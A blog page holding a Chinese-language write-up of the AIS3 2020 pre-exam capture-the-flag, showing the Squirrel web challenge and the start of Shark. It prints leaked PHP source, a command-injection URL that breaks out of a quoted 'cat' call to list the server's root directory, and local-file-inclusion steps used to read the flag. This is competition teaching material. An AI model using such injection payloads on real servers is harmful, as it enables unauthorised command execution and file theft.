<!doctype html>
<!--
  Minimal Mistakes Jekyll Theme 4.24.0 by Michael Rose
  Copyright 2013-2020 Michael Rose - mademistakes.com | @mmistakes
  Free for personal and commercial use under the MIT license
  https://github.com/mmistakes/minimal-mistakes/blob/master/LICENSE
-->
<html lang="en" class="no-js">
  <head>
    <meta charset="utf-8">

<!-- begin _includes/seo.html --><title>AIS3 2020 Pre-exam Writeup (ä¸­æ–‡) - Just Still</title>
<meta name="description" content="AIS3 å‰æ¸¬æ™‚é–“åˆåˆ°äº†!">


  <meta name="author" content="Still Hsu">
  
  <meta property="article:author" content="Still Hsu">
  


<meta property="og:type" content="article">
<meta property="og:locale" content="en_US">
<meta property="og:site_name" content="Just Still">
<meta property="og:title" content="AIS3 2020 Pre-exam Writeup (ä¸­æ–‡)">
<meta property="og:url" content="https://stillu.cc/writeup/2020/06/28/ais3-preexam-zh-2020/">


  <meta property="og:description" content="AIS3 å‰æ¸¬æ™‚é–“åˆåˆ°äº†!">



  <meta property="og:image" content="https://stillu.cc/assets/images/posts/ais3-2020-writeup/CRNHLxU.png">



  <meta name="twitter:site" content="@StillAzureH">
  <meta name="twitter:title" content="AIS3 2020 Pre-exam Writeup (ä¸­æ–‡)">
  <meta name="twitter:description" content="AIS3 å‰æ¸¬æ™‚é–“åˆåˆ°äº†!">
  <meta name="twitter:url" content="https://stillu.cc/writeup/2020/06/28/ais3-preexam-zh-2020/">

  
    <meta name="twitter:card" content="summary_large_image">
    <meta name="twitter:image" content="https://stillu.cc/assets/images/posts/ais3-2020-writeup/CRNHLxU.png">
  

  



  <meta property="article:published_time" content="2020-06-28T00:00:00+08:00">





  

  


<link rel="canonical" href="https://stillu.cc/writeup/2020/06/28/ais3-preexam-zh-2020/">




<script type="application/ld+json">
  {
    "@context": "https://schema.org",
    
      "@type": "Person",
      "name": "Still Hsu",
      "url": "https://stillu.cc/"
    
  }
</script>







<!-- end _includes/seo.html -->



  <link href="/feed.xml" type="application/atom+xml" rel="alternate" title="Just Still Feed">


<!-- https://t.co/dKP3o1e -->
<meta name="viewport" content="width=device-width, initial-scale=1.0">

<script>
  document.documentElement.className = document.documentElement.className.replace(/\bno-js\b/g, '') + ' js ';
</script>

<!-- For all browsers -->
<link rel="stylesheet" href="/assets/css/main.css">
<link rel="preload" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free@5/css/all.min.css" as="style" onload="this.onload=null;this.rel='stylesheet'">
<noscript><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free@5/css/all.min.css"></noscript>



    <!-- start custom head snippets -->

<!-- insert favicons. use https://realfavicongenerator.net/ -->

<!-- end custom head snippets -->

<link rel="apple-touch-icon" sizes="57x57" href="/assets/icons/apple-icon-57x57.png">
<link rel="apple-touch-icon" sizes="60x60" href="/assets/icons/apple-icon-60x60.png">
<link rel="apple-touch-icon" sizes="72x72" href="/assets/icons/apple-icon-72x72.png">
<link rel="apple-touch-icon" sizes="76x76" href="/assets/icons/apple-icon-76x76.png">
<link rel="apple-touch-icon" sizes="114x114" href="/assets/icons/apple-icon-114x114.png">
<link rel="apple-touch-icon" sizes="120x120" href="/assets/icons/apple-icon-120x120.png">
<link rel="apple-touch-icon" sizes="144x144" href="/assets/icons/apple-icon-144x144.png">
<link rel="apple-touch-icon" sizes="152x152" href="/assets/icons/apple-icon-152x152.png">
<link rel="apple-touch-icon" sizes="180x180" href="/assets/icons/apple-icon-180x180.png">
<link rel="icon" type="image/png" sizes="192x192"  href="/assets/icons/android-icon-192x192.png">
<link rel="icon" type="image/png" sizes="32x32" href="/assets/icons/favicon-32x32.png">
<link rel="icon" type="image/png" sizes="96x96" href="/assets/icons/favicon-96x96.png">
<link rel="icon" type="image/png" sizes="16x16" href="/assets/icons/favicon-16x16.png">
<link rel="manifest" href="/assets/icons/manifest.json">
<meta name="msapplication-TileColor" content="#F21368">
<meta name="msapplication-TileImage" content="/ms-icon-144x144.png">
<meta name="theme-color" content="#F21368">
  </head>

  <body class="layout--single wide">
    <nav class="skip-links">
  <ul>
    <li><a href="#site-nav" class="screen-reader-shortcut">Skip to primary navigation</a></li>
    <li><a href="#main" class="screen-reader-shortcut">Skip to content</a></li>
    <li><a href="#footer" class="screen-reader-shortcut">Skip to footer</a></li>
  </ul>
</nav>

    <!--[if lt IE 9]>
<div class="notice--danger align-center" style="margin: 0;">You are using an <strong>outdated</strong> browser. Please <a href="https://browsehappy.com/">upgrade your browser</a> to improve your experience.</div>
<![endif]-->

    

<div class="masthead">
  <div class="masthead__inner-wrap">
    <div class="masthead__menu">
      <nav id="site-nav" class="greedy-nav">
        
          <a class="site-logo" href="/"><img src="/assets/images/avatar-512.png" alt="Just Still"></a>
        
        <a class="site-title" href="/">
          Just Still
          
        </a>
        <ul class="visible-links"><li class="masthead__menu-item">
              <a href="/about">About</a>
            </li><li class="masthead__menu-item">
              <a href="/categories">Posts</a>
            </li></ul>
        
        <button class="search__toggle" type="button">
          <span class="visually-hidden">Toggle search</span>
          <i class="fas fa-search"></i>
        </button>
        
        <button class="greedy-nav__toggle hidden" type="button">
          <span class="visually-hidden">Toggle menu</span>
          <div class="navicon"></div>
        </button>
        <ul class="hidden-links hidden"></ul>
      </nav>
    </div>
  </div>
</div>


    <div class="initial-content">
      
  







<div class="page__hero--overlay"
  style="background-color: #000; background-image: linear-gradient(rgba(0, 0, 0, 0.75), rgba(0, 0, 0, 0.75)), url('/assets/images/posts/ais3-2020-writeup/CRNHLxU.png');"
>
  
    <div class="wrapper">
      <h1 id="page-title" class="page__title" itemprop="headline">
        
          AIS3 2020 Pre-exam Writeup (ä¸­æ–‡)

        
      </h1>
      
        <p class="page__lead">AIS3 å‰æ¸¬æ™‚é–“åˆåˆ°äº†!
</p>
      
      

  <p class="page__meta">
    
      
      <span class="page__meta-date">
        <i class="far fa-calendar-alt" aria-hidden="true"></i>
        
        <time datetime="2020-06-28T00:00:00+08:00">June 28, 2020</time>
      </span>
    

    <span class="page__meta-sep"></span>

    
      
      

      <span class="page__meta-readtime">
        <i class="far fa-clock" aria-hidden="true"></i>
        
          14 minute read
        
      </span>
    
  </p>


      
      
    </div>
  
  
</div>




  
    



<nav class="breadcrumbs">
  <ol itemscope itemtype="https://schema.org/BreadcrumbList">
    
    
    
      
        <li itemprop="itemListElement" itemscope itemtype="https://schema.org/ListItem">
          <a href="https://stillu.cc/" itemprop="item"><span itemprop="name">Home</span></a>
          <meta itemprop="position" content="1" />
        </li>
        <span class="sep">/</span>
      
      
        
        <li itemprop="itemListElement" itemscope itemtype="https://schema.org/ListItem">
          <a href="/categories/#writeup" itemprop="item"><span itemprop="name">Writeup</span></a>
          <meta itemprop="position" content="2" />
        </li>
        <span class="sep">/</span>
      
    
      
      
        
        <li itemprop="itemListElement" itemscope itemtype="https://schema.org/ListItem">
          <a href="/categories/#2020" itemprop="item"><span itemprop="name">2020</span></a>
          <meta itemprop="position" content="3" />
        </li>
        <span class="sep">/</span>
      
    
      
      
        
        <li itemprop="itemListElement" itemscope itemtype="https://schema.org/ListItem">
          <a href="/categories/#06" itemprop="item"><span itemprop="name">06</span></a>
          <meta itemprop="position" content="4" />
        </li>
        <span class="sep">/</span>
      
    
      
      
        
        <li itemprop="itemListElement" itemscope itemtype="https://schema.org/ListItem">
          <a href="/categories/#28" itemprop="item"><span itemprop="name">28</span></a>
          <meta itemprop="position" content="5" />
        </li>
        <span class="sep">/</span>
      
    
      
      
        <li class="current">AIS3 2020 Pre-exam Writeup (ä¸­æ–‡)</li>
      
    
  </ol>
</nav>

  


<div id="main" role="main">
  
  <div class="sidebar sticky">
  


<div itemscope itemtype="https://schema.org/Person">

  
    <div class="author__avatar">
      
        <img src="/assets/images/avatar-512.png" alt="Still Hsu" itemprop="image">
      
    </div>
  

  <div class="author__content">
    
      <h3 class="author__name" itemprop="name">Still Hsu</h3>
    
    
      <div class="author__bio" itemprop="description">
        <p>Developer, photographer, infosec researcher.</p>

      </div>
    
  </div>

  <div class="author__urls-wrapper">
    <button class="btn btn--inverse">Follow</button>
    <ul class="author__urls social-icons">
      
        <li itemprop="homeLocation" itemscope itemtype="https://schema.org/Place">
          <i class="fas fa-fw fa-map-marker-alt" aria-hidden="true"></i> <span itemprop="name">Taiwan</span>
        </li>
      

      
        
          
            <li><a href="https://twitter.com/StillAzureH" rel="nofollow noopener noreferrer"><i class="fab fa-fw fa-twitter-square" aria-hidden="true"></i><span class="label">Twitter</span></a></li>
          
        
          
            <li><a href="https://github.com/Still34" rel="nofollow noopener noreferrer"><i class="fab fa-fw fa-github" aria-hidden="true"></i><span class="label">GitHub</span></a></li>
          
        
          
            <li><a href="/.well-known/pubkey.asc" rel="nofollow noopener noreferrer"><i class="fas fa-user-lock" aria-hidden="true"></i><span class="label">GPG (Email)</span></a></li>
          
        
      

      

      
        <li>
          <a href="mailto:business@stillu.cc">
            <meta itemprop="email" content="business@stillu.cc" />
            <i class="fas fa-fw fa-envelope-square" aria-hidden="true"></i><span class="label">Email</span>
          </a>
        </li>
      

      

      

      

      

      

      

      

      

      

      

      

      

      

      

      

      

      

      

      

      

      

      

      <!--
  <li>
    <a href="http://link-to-whatever-social-network.com/user/" itemprop="sameAs" rel="nofollow noopener noreferrer">
      <i class="fas fa-fw" aria-hidden="true"></i> Custom Social Profile Link
    </a>
  </li>
-->
    </ul>
  </div>
</div>

  
  </div>



  <article class="page" itemscope itemtype="https://schema.org/CreativeWork">
    <meta itemprop="headline" content="AIS3 2020 Pre-exam Writeup (ä¸­æ–‡)">
    <meta itemprop="description" content="AIS3 å‰æ¸¬æ™‚é–“åˆåˆ°äº†!">
    <meta itemprop="datePublished" content="2020-06-28T00:00:00+08:00">
    

    <div class="page__inner-wrap">
      

      <section class="page__content" itemprop="text">
        
          <aside class="sidebar__right ">
            <nav class="toc">
              <header><h4 class="nav__title"><i class="fas fa-file-alt"></i> On this page</h4></header>
              <ul class="toc__menu"><li><a href="#å‰è¨€">å‰è¨€</a></li><li><a href="#web">Web</a><ul><li><a href="#-squirrel-100-pt">ğŸ¿ Squirrel (100 pt.)</a></li><li><a href="#-shark-100-pt">ğŸ¦ˆ Shark (100 pt.)</a></li><li><a href="#-elephant-168-pt">ğŸ˜ Elephant (168 pt.)</a></li><li><a href="#-snake-272-pt">ğŸ Snake (272 pt.)</a></li><li><a href="#-rhino-494-pt">ğŸ¦ Rhino (494 pt.)</a></li><li><a href="#-owl-492-pt">ğŸ¦‰ Owl (492 pt.)</a></li></ul></li><li><a href="#crypto">Crypto</a><ul><li><a href="#-brontosaurus-100-pt">ğŸ¦• Brontosaurus (100 pt.)</a></li><li><a href="#-t-rex-100-pt">ğŸ¦– T-Rex (100 pt.)</a></li></ul></li><li><a href="#pwn">Pwn</a><ul><li><a href="#-bof-100-pt">ğŸ‘» BOF (100 pt.)</a></li></ul></li><li><a href="#reverse">Reverse</a><ul><li><a href="#-tsaibro-100-pt">ğŸ TsaiBro (100 pt.)</a></li><li><a href="#-fallen-beat-144-pt">ğŸ¹ Fallen Beat (144 pt.)</a></li><li><a href="#-la-vie-en-rose-499-pt">ğŸŒ¹ La vie en rose (499 pt.)</a></li></ul></li><li><a href="#misc">Misc</a><ul><li><a href="#-piquero-100-pt">ğŸ’¤ Piquero (100 pt.)</a></li><li><a href="#-karuego-100-pt">ğŸ¥ Karuego (100 pt.)</a></li><li><a href="#-soy-139-pt">ğŸŒ± Soy (139 pt.)</a></li><li><a href="#-saburo-359-pt">ğŸ‘‘ Saburo (359 pt.)</a></li></ul></li></ul>

            </nav>
          </aside>
        
        <h2 id="å‰è¨€">å‰è¨€</h2>

<p>å°å¼Ÿä¸­æ–‡ä¸å¥½ï¼Œå¦‚æœæœ‰ä¸­æ–‡ä¸é€šé †çš„åœ°æ–¹è«‹è¦‹è«’ &lt;(ï¼¿ã€€ï¼¿)&gt;</p>

<p>é€™æ¬¡æ¯”æˆ‘å»å¹´ç¬¬ä¸€æ¬¡æ‰“çš„æ™‚å€™æœ‰ç¶“é©—å¤šäº†ï¼Œå»å¹´å·®ä¸å¤š100åå·¦å³ï¼Œé€™æ¬¡çˆ¬åˆ°äº† 43 åã€‚å¾ˆå¯æƒœçš„ï¼Œæœ‰å¹¾é¡Œæˆ‘éƒ½æ˜¯æˆ³ä¸­é‚Šæˆ–è€…æ˜¯èŠ±å¤ªå¤šæ™‚é–“åœ¨éƒ¨åˆ†é¡Œç›®å°è‡´å…¶ä»–å¹¾é¡Œæ²’æœ‰å¤šé¤˜æ™‚é–“çœ‹å®Œã€‚æ¯”å¦‚åƒæ˜¯ Claraï¼ŒClara é‚£é¡Œæˆ‘å¾ˆæ—©å°±çœ‹åˆ°æœ‰å•é¡Œçš„å°åŒ…ç”šè‡³æ˜¯ Key Exchange ä¸­çš„ Keyï¼Œä½†æ˜¯åªèƒ½èªªç¶“é©—ä¸è¶³ï¼Œä¸€é–‹å§‹æ²’æ„è­˜åˆ°æˆ‘æ‰€çœ‹åˆ°çš„å­—ä¸²éƒ¨åˆ†æ˜¯ Keyï¼Œè€ŒåŠ å¯†æ–¹å¼æ˜¯ç´”ç²¹ XORã€‚æˆ‘æ˜¯åœ¨æ¯”è³½çµæŸå¾Œæ²’å¤šä¹…æ‰ç™¼ç¾é€™å›äº‹çš„ã€‚éå¸¸å¯æƒœå› ç‚º Clara é‚£é¡Œ 500 åˆ†ã€‚ä½†æ•´é«”è€Œè¨€æˆ‘é‚„æ˜¯å°é€™æ¬¡ AIS3 å¾ˆæ»¿æ„ä¹Ÿè¦ºå¾—åˆå­¸åˆ°äº†ä¸å°‘ï¼Œå¦‚ Rose é‚£é¡Œï¼Œæˆ‘åœ¨ä¹‹å‰å…¶å¯¦æ²’æœ‰æ„è­˜åˆ° Python åœ¨åŸ·è¡Œæ™‚æœƒ Compile æˆ Bytecodeï¼Œä¹Ÿè¶æ©Ÿå­¸æœƒäº†é€™é»ã€‚</p>

<p><img src="/assets/images/posts/ais3-2020-writeup/BOIkrai.png" alt="" /></p>

<h2 id="web">Web</h2>

<h3 id="-squirrel-100-pt">ğŸ¿ Squirrel (100 pt.)</h3>

<p>é€™é¡Œä¸€æ‰“é–‹æœƒçœ‹åˆ°ä¸€å †åˆ°è™•åœ¨è·‘çš„æ¾é¼ ï¼Œä¸€é–‹å§‹å®Œå…¨ä¸çŸ¥é“åœ¨å¹¹å˜›ï¼Œä½†é‚£äº›æ¾é¼ ä¸Šå¯«çš„ç”¨æˆ¶åéå¸¸ä¼¼æ›¾ç›¸è­˜â€¦ é€™äº›ä¸æ˜¯å¸¸è¦‹çš„Linuxä½¿ç”¨è€…å¸³è™Ÿå—ï¼Ÿ</p>

<p><img src="/assets/images/posts/ais3-2020-writeup/eitKpZA.png" alt="" /></p>

<p>ä¼°è¨ˆæ˜¯å¾ <code class="language-plaintext highlighter-rouge">/etc/passwd</code> ç¿»å‡ºä¾†çš„ï¼Œå’±å€‘ä¾†çœ‹çœ‹é€™å€‹ç¶²é çš„åŸå§‹ç¢¼ã€‚</p>

<div class="language-shell highlighter-rouge"><div class="highlight"><pre class="highlight"><code>â¯ curl https://squirrel.ais3.org/
&lt;<span class="o">!</span>DOCTYPE html&gt;

&lt;<span class="nb">head</span><span class="o">&gt;</span>
  &lt;title&gt;ğŸ¿ï¸ğŸ¿ï¸ğŸ¿ï¸ğŸ¿ï¸ğŸ¿ï¸&lt;/title&gt;
  &lt;meta <span class="nv">charset</span><span class="o">=</span><span class="s2">"utf-8"</span><span class="o">&gt;</span>
  &lt;<span class="nb">link </span><span class="nv">rel</span><span class="o">=</span><span class="s2">"stylesheet"</span> <span class="nv">href</span><span class="o">=</span><span class="s2">"css/style.css"</span><span class="o">&gt;</span>
&lt;/head&gt;

&lt;body&gt;
  &lt;template <span class="nb">id</span><span class="o">=</span><span class="s2">"squirrel-template"</span><span class="o">&gt;</span>
    &lt;div <span class="nv">class</span><span class="o">=</span><span class="s2">"squirrel"</span><span class="o">&gt;</span>
      &lt;div <span class="nv">class</span><span class="o">=</span><span class="s2">"icon"</span><span class="o">&gt;</span>ğŸ¿ï¸&lt;/div&gt;
      &lt;div <span class="nv">class</span><span class="o">=</span><span class="s2">"name"</span><span class="o">&gt;</span>squirrel&lt;/div&gt;
    &lt;/div&gt;
  &lt;/template&gt;

  &lt;script <span class="nv">src</span><span class="o">=</span><span class="s2">"js/squirrel.js"</span><span class="o">&gt;</span>&lt;/script&gt;
  &lt;script&gt;
    const squirrelFile <span class="o">=</span> <span class="s1">'/etc/passwd'</span><span class="p">;</span>

    fetch<span class="o">(</span><span class="s1">'api.php?get='</span> + encodeURIComponent<span class="o">(</span>squirrelFile<span class="o">))</span>
      .then<span class="o">(</span>res <span class="o">=&gt;</span> res.json<span class="o">())</span>
      .then<span class="o">(</span>data <span class="o">=&gt;</span> <span class="o">{</span>
        <span class="k">if</span> <span class="o">(</span><span class="s1">'error'</span> <span class="k">in </span>data<span class="o">)</span> <span class="o">{</span>
          throw data.error<span class="p">;</span>
        <span class="o">}</span>
        data.output.split<span class="o">(</span><span class="s1">'\n'</span><span class="o">)</span>
          .map<span class="o">(</span>line <span class="o">=&gt;</span> line.split<span class="o">(</span><span class="s1">':'</span><span class="o">)[</span>0].trim<span class="o">())</span>
          .filter<span class="o">(</span>name <span class="o">=&gt;</span> name.length<span class="o">)</span>
          .forEach<span class="o">(</span>name <span class="o">=&gt;</span> new Squirrel<span class="o">(</span>name<span class="o">)</span>.update<span class="o">())</span><span class="p">;</span>
      <span class="o">})</span>
      .catch<span class="o">(</span>err <span class="o">=&gt;</span> <span class="o">{</span>
        console.log<span class="o">(</span>err<span class="o">)</span><span class="p">;</span>
        alert<span class="o">(</span><span class="s1">'Something went wrong! Please report this to the author!'</span><span class="o">)</span><span class="p">;</span>
      <span class="o">})</span><span class="p">;</span>
  &lt;/script&gt;
&lt;/body&gt;
</code></pre></div></div>

<p>è·Ÿä¸€é–‹å§‹æƒ³çš„ä¸€æ¨£ï¼Œæœç„¶æ˜¯ <code class="language-plaintext highlighter-rouge">/etc/passwd</code> å‡ºä¾†çš„ï¼Œè€Œä¸”é¡Œç›®é‚„å¾ˆå¥½å¿ƒçš„å‘Šè¨´æˆ‘å€‘å¾å“ªè£¡æ‹‰é€™å€‹æª”æ¡ˆå‡ºä¾†çš„ï¼é€™å€‹æ™‚å€™å°±æ˜¯é–‹å§‹æˆ³ <code class="language-plaintext highlighter-rouge">api.php</code> çœ‹çœ‹æœƒæœ‰ä»€éº¼æ±è¥¿ã€‚æˆ‘å€‘é€é <code class="language-plaintext highlighter-rouge">api.php</code> çš„ GET parameter å¯ä»¥å¾—çŸ¥é€™å€‹ PHP æœ‰å¾ˆå¤§çš„ LFI (Local File Inclusion) æ¼æ´ã€‚é€™æ™‚æˆ‘å€‘å¯ä»¥é€éå®ƒä¾†å–å¾—è‡ªå·±çš„åŸå§‹ç¢¼ã€‚</p>

<p><img src="/assets/images/posts/ais3-2020-writeup/ZkPkcf7.png" alt="" /></p>

<p>çœ‹èµ·ä¾†éƒ½å·²ç¶“é€é <code class="language-plaintext highlighter-rouge">json_encode</code> æŠŠæ‰€æœ‰çš„æ›è¡Œç¬¦è™Ÿæ›¿æ›æˆ <code class="language-plaintext highlighter-rouge">\n</code>ï¼Œé€™æ™‚å¯ä»¥é€éPowerShellçš„ string.Replace æŠŠæ‰€æœ‰çš„ <code class="language-plaintext highlighter-rouge">\n</code> æ›å›æœ¬åœ°ç«¯ç›¸å®¹çš„æ›è¡Œç¬¦è™Ÿä»¥ä¾¿è®€å–ã€‚</p>

<div class="language-powershell highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="p">(</span><span class="n">curl</span><span class="w"> </span><span class="nx">https://squirrel.ais3.org/api.php</span><span class="nf">?</span><span class="nx">get</span><span class="o">=</span><span class="nx">api.php</span><span class="w"> </span><span class="nt">-s</span><span class="p">)</span><span class="o">.</span><span class="nf">replace</span><span class="p">(</span><span class="s1">'\n'</span><span class="p">,[</span><span class="n">System.Environment</span><span class="p">]::</span><span class="nx">NewLine</span><span class="p">)</span><span class="w">
</span></code></pre></div></div>

<p>ä¹‹å¾Œå°±å¯ä»¥è¼•é¬†å–å¾—å¯æ–¹ä¾¿è®€å–çš„åŸå§‹ç¢¼ã€‚</p>

<div class="language-php highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="cp">&lt;?php</span>

<span class="nb">header</span><span class="p">(</span><span class="s1">'Content-Type: application/json'</span><span class="p">);</span>

<span class="k">if</span> <span class="p">(</span><span class="nv">$file</span> <span class="o">=</span> <span class="o">@</span><span class="nv">$_GET</span><span class="p">[</span><span class="s1">'get'</span><span class="p">])</span> <span class="p">{</span>
    <span class="nv">$output</span> <span class="o">=</span> <span class="nb">shell_exec</span><span class="p">(</span><span class="s2">"cat '</span><span class="nv">$file</span><span class="s2">'"</span><span class="p">);</span>

    <span class="k">if</span> <span class="p">(</span><span class="nv">$output</span> <span class="o">!==</span> <span class="kc">null</span><span class="p">)</span> <span class="p">{</span>
        <span class="k">echo</span> <span class="nb">json_encode</span><span class="p">([</span>
            <span class="s1">'output'</span> <span class="o">=&gt;</span> <span class="nv">$output</span>
        <span class="p">]);</span>
    <span class="p">}</span> <span class="k">else</span> <span class="p">{</span>
        <span class="k">echo</span> <span class="nb">json_encode</span><span class="p">([</span>
            <span class="s1">'error'</span> <span class="o">=&gt;</span> <span class="s1">'cannot get file'</span>
        <span class="p">]);</span>
    <span class="p">}</span>
<span class="p">}</span> <span class="k">else</span> <span class="p">{</span>
    <span class="k">echo</span> <span class="nb">json_encode</span><span class="p">([</span>
        <span class="s1">'error'</span> <span class="o">=&gt;</span> <span class="s1">'empty file path'</span>
    <span class="p">]);</span>
<span class="p">}</span>
</code></pre></div></div>

<p>è€Œåœ¨ Line 6 æˆ‘å€‘å¯ä»¥çœ‹åˆ°ä¸€å€‹éå¸¸æœ‰å•é¡Œçš„ <code class="language-plaintext highlighter-rouge">shell_exec</code>ï¼Œæ ¹æ“šå®˜æ–¹æŠ€è¡“æ–‡ä»¶å¯ä»¥å¾—çŸ¥ shell_exec é€šå¸¸æœƒä»¥ä½¿ç”¨è€… <code class="language-plaintext highlighter-rouge">www</code> çš„èº«åˆ†åŸ·è¡Œä»»ä½•æŒ‡ä»¤ä¸¦å°‡ stdout å™´å›è®Šæ•¸å…§ã€‚è€Œé€™é»å±éšªæ˜¯å±éšªåœ¨ç•¶ä½¿ç”¨è€…å¯ä»¥å­˜å–è®Šæ•¸å…§å®¹æ™‚ï¼Œä½¿ç”¨è€…å¯ä»¥é€é Command Injection çš„æ–¹å¼åŸ·è¡Œä»»æ„æŒ‡ä»¤ã€‚æˆ‘å€‘å› æ­¤å¯ä»¥é€éå­—å…ƒé€ƒè„« (character escape) çš„æ–¹å¼è·³å‡º <code class="language-plaintext highlighter-rouge">cat '$file'</code> ä¸­çš„å–®å¼•è™Ÿï¼Œæ¥è‘—é€éåˆ†è™Ÿä¾†åŸ·è¡Œç¬¬äºŒå€‹æŒ‡ä»¤ã€‚</p>

<p>æ‰€ä»¥æœ€çµ‚çµæœçš„URLæ˜¯ <code class="language-plaintext highlighter-rouge">https://squirrel.ais3.org/api.php?get=';ls+/'</code></p>

<div class="language-json highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="p">{</span><span class="w">
  </span><span class="nl">"output"</span><span class="p">:</span><span class="w"> </span><span class="s2">"5qu1rr3l_15_4_k1nd_0f_b16_r47.txt</span><span class="se">\n</span><span class="s2">bin</span><span class="se">\n</span><span class="s2">boot</span><span class="se">\n</span><span class="s2">dev</span><span class="se">\n</span><span class="s2">etc</span><span class="se">\n</span><span class="s2">home</span><span class="se">\n</span><span class="s2">lib</span><span class="se">\n</span><span class="s2">lib64</span><span class="se">\n</span><span class="s2">media</span><span class="se">\n</span><span class="s2">mnt</span><span class="se">\n</span><span class="s2">opt</span><span class="se">\n</span><span class="s2">proc</span><span class="se">\n</span><span class="s2">root</span><span class="se">\n</span><span class="s2">run</span><span class="se">\n</span><span class="s2">sbin</span><span class="se">\n</span><span class="s2">srv</span><span class="se">\n</span><span class="s2">sys</span><span class="se">\n</span><span class="s2">tmp</span><span class="se">\n</span><span class="s2">usr</span><span class="se">\n</span><span class="s2">var</span><span class="se">\n</span><span class="s2">"</span><span class="w">
</span><span class="p">}</span><span class="w">
</span></code></pre></div></div>

<p>å¤§åŠŸå‘Šæˆï¼æˆ‘å€‘æ‹¿åˆ°äº† <code class="language-plaintext highlighter-rouge">/</code> åº•ä¸‹çš„ç›®éŒ„ï¼Œè€Œä¸”å‰›å¥½æˆ‘å€‘çš„flagæª”æ¡ˆä¹Ÿåœ¨æ ¹ç›®éŒ„ä¸‹ï¼</p>

<div class="language-shell highlighter-rouge"><div class="highlight"><pre class="highlight"><code>â¯ curl <span class="s2">"https://squirrel.ais3.org/api.php?get=/5qu1rr3l_15_4_k1nd_0f_b16_r47.txt"</span> <span class="nt">-s</span> | jq <span class="nt">-C</span>

<span class="o">{</span>
  <span class="s2">"output"</span>: <span class="s2">"AIS3{5qu1rr3l_15_4_k1nd_0f_b16_r47}</span><span class="se">\n</span><span class="s2">"</span>
<span class="o">}</span>
</code></pre></div></div>

<p>Flag:
<code class="language-plaintext highlighter-rouge">AIS3{5qu1rr3l_15_4_k1nd_0f_b16_r47}</code></p>

<h3 id="-shark-100-pt">ğŸ¦ˆ Shark (100 pt.)</h3>

<blockquote>
  <p>Letâ€™s dive deep again this year.</p>
</blockquote>

<p>å› ç‚ºå»å¹´æœ‰æ‰“é AIS3 2019 çš„é—œä¿‚ï¼Œæ‰€ä»¥é¦¬ä¸Šæƒ³åˆ°çš„æ˜¯å»å¹´ dive deeper çš„é¡Œç›®ï¼Œæ˜¯å€‹ç”¨ <code class="language-plaintext highlighter-rouge">php://filter</code> è§£çš„ç¶“å…¸LFIé¡Œã€‚ä¸ç®¡æ˜¯ä¸æ˜¯ï¼Œæˆ‘å€‘å…ˆ curl çœ‹ä¸€çœ‹å†èªªã€‚</p>

<p><img src="/assets/images/posts/ais3-2020-writeup/D44YYq7.png" alt="" /></p>

<p>çœ‹åˆ° <code class="language-plaintext highlighter-rouge">?path=hint.txt</code> æ„Ÿè¦ºåˆæ˜¯ä¸€å€‹LFIé¡Œï¼Œæˆ‘å€‘å…ˆçœ‹çœ‹ <code class="language-plaintext highlighter-rouge">index.php</code> æœ‰æ²’æœ‰å­˜åœ¨ã€‚</p>

<div class="language-php highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="cp">&lt;?php</span>

    <span class="k">if</span> <span class="p">(</span><span class="nv">$path</span> <span class="o">=</span> <span class="o">@</span><span class="nv">$_GET</span><span class="p">[</span><span class="s1">'path'</span><span class="p">])</span> <span class="p">{</span>
        <span class="k">if</span> <span class="p">(</span><span class="nb">preg_match</span><span class="p">(</span><span class="s1">'/^(\.|\/)/'</span><span class="p">,</span> <span class="nv">$path</span><span class="p">))</span> <span class="p">{</span>
            <span class="c1">// disallow /path/like/this and ../this</span>
            <span class="k">die</span><span class="p">(</span><span class="s1">'&lt;pre&gt;[forbidden]&lt;/pre&gt;'</span><span class="p">);</span>
        <span class="p">}</span>
        <span class="nv">$content</span> <span class="o">=</span> <span class="o">@</span><span class="nb">file_get_contents</span><span class="p">(</span><span class="nv">$path</span><span class="p">,</span> <span class="kc">FALSE</span><span class="p">,</span> <span class="kc">NULL</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="mi">1000</span><span class="p">);</span>
        <span class="k">die</span><span class="p">(</span><span class="s1">'&lt;pre&gt;'</span> <span class="mf">.</span> <span class="p">(</span><span class="nv">$content</span> <span class="o">?</span> <span class="nb">htmlentities</span><span class="p">(</span><span class="nv">$content</span><span class="p">)</span> <span class="o">:</span> <span class="s1">'[empty]'</span><span class="p">)</span> <span class="mf">.</span> <span class="s1">'&lt;/pre&gt;'</span><span class="p">);</span>
    <span class="p">}</span>

<span class="cp">?&gt;</span>
</code></pre></div></div>
<p>æœç„¶æœ‰ï¼Œè€Œä¸”é‚„é€é regex æŠŠå¸¸è¦‹çš„å±éšªç¬¦è™Ÿéƒ½å»æ‰äº†ï¼
ä½†æ˜¯ï¼
<code class="language-plaintext highlighter-rouge">php://</code> çš„URIæ²’æœ‰å»æ‰ï¼æœç„¶è·Ÿå»å¹´é¡Œç›®ä¸€æ¨£å‘¢ï¼</p>

<p><code class="language-plaintext highlighter-rouge">php://</code> æ˜¯ä»€éº¼å‘¢ï¼Ÿ å®˜æ–¹æ–‡ä»¶å¯«é“ï¼š</p>

<blockquote>
  <p>PHP comes with many built-in wrappers for various URL-style protocols for use with the filesystem functions such as fopen(), copy(), file_exists() and filesize(). In addition to these wrappers, it is possible to register custom wrappers using the stream_wrapper_register() function.</p>
</blockquote>

<blockquote>
  <p>php://filter is a kind of meta-wrapper designed to permit the application of filters to a stream at the time of opening. This is useful with all-in-one file functions such as readfile(), file(), and file_get_contents() where there is otherwise no opportunity to apply a filter to the stream prior the contents being read.</p>
</blockquote>

